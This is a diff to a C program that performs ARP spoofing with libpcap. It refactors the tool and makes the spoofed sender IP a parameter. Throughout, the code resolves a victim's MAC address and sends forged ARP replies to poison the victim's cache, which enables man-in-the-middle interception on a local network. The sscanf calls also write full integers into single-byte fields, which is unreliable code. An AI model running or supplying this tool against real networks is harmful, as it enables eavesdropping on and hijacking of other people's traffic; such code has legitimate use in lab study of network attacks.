@@ -13,7 +13,7 @@
 
 #include "arp_spoof.h"
 
-#define PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)
+#define ARP_PACKET_LEN sizeof(struct ether_header) + sizeof(struct ether_arp)
 
 void getLocalAddress(u_int8_t * ifname, u_int8_t * get_ip, u_int8_t * get_mac, u_int8_t * get_router)
 {
@@ -28,7 +28,7 @@ void getLocalAddress(u_int8_t * ifname, u_int8_t * get_ip, u_int8_t * get_mac, u
 
   if (sock < 0) {
     perror("ERROR opening socket\n");
-    exit(1);
+    exit(EXIT_FAILURE);
   }
 
   strncpy(ifr.ifr_name,ifname,sizeof(ifr.ifr_name));
@@ -37,7 +37,7 @@ void getLocalAddress(u_int8_t * ifname, u_int8_t * get_ip, u_int8_t * get_mac, u
 
   if (ioctl( sock, SIOCGIFHWADDR, &ifr ) < 0) { 
     perror("ERROR opening ioctl mac\n");
-    exit(0);
+    exit(EXIT_FAILURE);
   }
 
 
@@ -54,52 +54,52 @@ void getLocalAddress(u_int8_t * ifname, u_int8_t * get_ip, u_int8_t * get_mac, u
   fp = popen(" /bin/bash -c \"ifconfig eth0\" | grep \'inet \' | awk \'{ print $2}\'", "r");
   if (fp == NULL) {
     printf("Failed to run command\n" );
-    exit(1);
+    exit(EXIT_FAILURE);
   }
 
 //fgets(ip, sizeof(ip), fp);
   while (fgets(ip, sizeof(ip)-1, fp) != NULL)
 
 
-    for(i =0; i<sizeof(ip)-1;i++)
-    {
-      if(ip[i]=='\n')
-        ip[i]='\0';
-    }
-    memcpy(get_ip,ip,sizeof(ip));  
+  for(i =0; i<sizeof(ip)-1;i++)
+  {
+    if(ip[i]=='\n')
+      ip[i]='\0';
+  }
+  memcpy(get_ip,ip,sizeof(ip));  
 
-    fp = NULL;
+  fp = NULL;
 
-    fp = popen(" ip route show | grep -i \'default via\'| awk \'{print $3 }\'", "r");
-    if (fp == NULL) {
-      printf("Failed to run command\n" );
-      exit(1);
-    }
+  fp = popen(" ip route show | grep -i \'default via\'| awk \'{print $3 }\'", "r");
+  if (fp == NULL) {
+    printf("Failed to run command\n" );
+    exit(EXIT_FAILURE);
+  }
 
-    while (fgets(router_ip, sizeof(router_ip) , fp) != NULL)
+  while (fgets(router_ip, sizeof(router_ip) , fp) != NULL)
 
 
 
-      for(i =0; i<sizeof (router_ip)-1;i++)
-      {
-        if(!(( router_ip[i] >= 0x30 && router_ip[i] <=0x39) ||  router_ip[i] == 0x2E ))
-          router_ip[i]='\0';
-      }
-      memcpy(get_router,router_ip,sizeof(router_ip));  
+  for(i =0; i<sizeof (router_ip)-1;i++)
+  {
+    if(!(( router_ip[i] >= 0x30 && router_ip[i] <=0x39) ||  router_ip[i] == 0x2E ))
+      router_ip[i]='\0';
+  }
+  memcpy(get_router,router_ip,sizeof(router_ip));  
 
   //printf("Get Local Information \n - Ip\t: %s \n - Mac\t: %s \n - Router \t: %s \n", get_ip, get_mac, get_router);
 
-      pclose(fp);
-      close(sock);  
+  pclose(fp);
+  close(sock);  
 
-    }
+}
 
 
 void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t *targetIP, u_int8_t *targetMAC)
 {
 
   pcap_t *handle;
-  char packet[PACKET_LEN];  
+  char packet[ARP_PACKET_LEN];  
   struct ether_header * eth = (struct ether_header *) packet;
   struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
   char errbuf[100] ; 
@@ -140,33 +140,33 @@ void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8
    (u_char *) &arp->arp_spa[3]);
 
   //Target Mac : Destination Mac Address : ARP Packet   
-   memset(arp->arp_tha, 0x00, 6);      
+  memset(arp->arp_tha, 0x00, 6);      
 
  //Ethernet Packet  
-   memset(eth->ether_dhost, 0xff, ETH_ALEN);   //destination address : broadcast address
-   memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN); //source address
-   eth->ether_type = htons(ETH_P_ARP);                  //type
+  memset(eth->ether_dhost, 0xff, ETH_ALEN);   //destination address : broadcast address
+  memcpy(eth->ether_shost, arp->arp_sha, ETH_ALEN); //source address
+  eth->ether_type = htons(ETH_P_ARP);                  //type
 
 
-  //ARP Packet
-   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
-   arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
-   arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
-   arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
-   arp->ea_hdr.ar_op = htons(ARPOP_REQUEST);              //ARP operation : REQUEST
+   //ARP Packet
+  arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
+  arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
+  arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
+  arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
+  arp->ea_hdr.ar_op = htons(ARPOP_REQUEST);              //ARP operation : REQUEST
 
  
-   if ( pcap_sendpacket(handle, (const u_char *)& packet, sizeof(packet)) == -1) 
-   {
-     printf("pcap_sendpacket err %s\n", pcap_geterr(handle));      
-   } 
-   else 
-   {
-     printf("Send to arp request -> ");
-   } 
+  if ( pcap_sendpacket(handle, (const u_char *)& packet, sizeof(packet)) == -1) 
+  {
+    printf("pcap_sendpacket err %s\n", pcap_geterr(handle));      
+  } 
+  else 
+  {
+    printf("Send to arp request -> ");
+  } 
 
 
-   while(1) {
+  while(1) {
 
     if(pcap_next_ex(handle, &header_ptr, &pkt_data)!=1)
     {
@@ -179,10 +179,12 @@ void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8
 
     eth = (struct ether_header*)pkt_data;
 
-    if (ntohs(eth->ether_type) == ETHERTYPE_ARP) {
+    if (ntohs(eth->ether_type) == ETHERTYPE_ARP)
+    {
       arp = (struct ether_arp*)(pkt_data + sizeof(struct ether_header));
-    } else {
-      //not arp proto
+    }
+    else 
+    {    
       continue;
     }
     if (ntohs(arp->ea_hdr.ar_pro) != ETHERTYPE_IP) {
@@ -208,11 +210,11 @@ void arp_request(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8
 }
 
 
-void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t *router, u_int8_t *targetIP, u_int8_t *targetMAC)
+void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t *Sender_IP, u_int8_t *targetIP, u_int8_t *targetMAC)
 {
 
   pcap_t *handle;
-  char packet[PACKET_LEN];
+  char packet[ARP_PACKET_LEN];
   char errbuf[100] ;
   struct ether_header * eth = (struct ether_header *) packet;
   struct ether_arp * arp = (struct ether_arp *) (packet + sizeof(struct ether_header));
@@ -232,6 +234,13 @@ void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t
     (u_char *) &arp->arp_sha[4],
     (u_char *) &arp->arp_sha[5]);
 
+  //Source IP Address : ARP Packet : Sender IP
+  sscanf(Sender_IP, "%d.%d.%d.%d", 
+   (u_char *) &arp->arp_spa[0],
+   (u_char *) &arp->arp_spa[1],
+   (u_char *) &arp->arp_spa[2],
+   (u_char *) &arp->arp_spa[3]);
+
    //Target Mac : Destination Mac Address : ARP Packet 
   sscanf(targetMAC,"%x:%x:%x:%x:%x:%x",
     (u_char *) &arp->arp_tha[0],
@@ -240,14 +249,6 @@ void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t
     (u_char *) &arp->arp_tha[3],
     (u_char *) &arp->arp_tha[4],
     (u_char *) &arp->arp_tha[5]);
-
-
-  //Source IP Address : ARP Packet : Router IP
-  sscanf(router, "%d.%d.%d.%d", 
-   (u_char *) &arp->arp_spa[0],
-   (u_char *) &arp->arp_spa[1],
-   (u_char *) &arp->arp_spa[2],
-   (u_char *) &arp->arp_spa[3]);
 
 
   //Target IP : Destination IP Address : ARP Packet
@@ -265,38 +266,23 @@ void arp_spoof(u_int8_t *ifname, u_int8_t *localIP, u_int8_t *localMAC, u_int8_t
 
 
   //ARP Packet
-   arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
-   arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
-   arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
-   arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
-   arp->ea_hdr.ar_op = htons(ARPOP_REPLY);              //ARP operation : REPLY
+  arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);            //Format of hardware address
+  arp->ea_hdr.ar_pro = htons(ETH_P_IP);                //Format of protocol address.
+  arp->ea_hdr.ar_hln = ETH_ALEN;                       //Length of hardware address.
+  arp->ea_hdr.ar_pln = 4;                              //Length of protocol address.
+  arp->ea_hdr.ar_op = htons(ARPOP_REPLY);              //ARP operation : REPLY
 
-   printf("\nARP SPOOFING :) : Press Ctrl+C to stop \n");
+  printf("\nARP SPOOFING :) : %s \n", targetIP);
 
-   while (1) 
-   {
-     if ( pcap_sendpacket(handle, (const u_char *)& packet, sizeof(packet)) == -1) 
-     {
-       fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));      
-     } 
-     else 
-     {
-       printf("Attack arp %s: %s is at %s\n", ifname, targetIP, targetMAC );
-     } 
+  
+  if ( pcap_sendpacket(handle, (const u_char *)& packet, sizeof(packet)) == -1) 
+  {
+    fprintf(stderr, "pcap_sendpacket err %s\n", pcap_geterr(handle));      
+  } 
+  else 
+  {
+    printf("Attack arp %s: %s is at %s\n", ifname, targetIP, targetMAC );
+  }  
 
-     sleep(2);
-   }
-
-   pcap_close(handle);
- }
-
-
-
-
-
-
-
-
-
-
-
+  pcap_close(handle);
+}
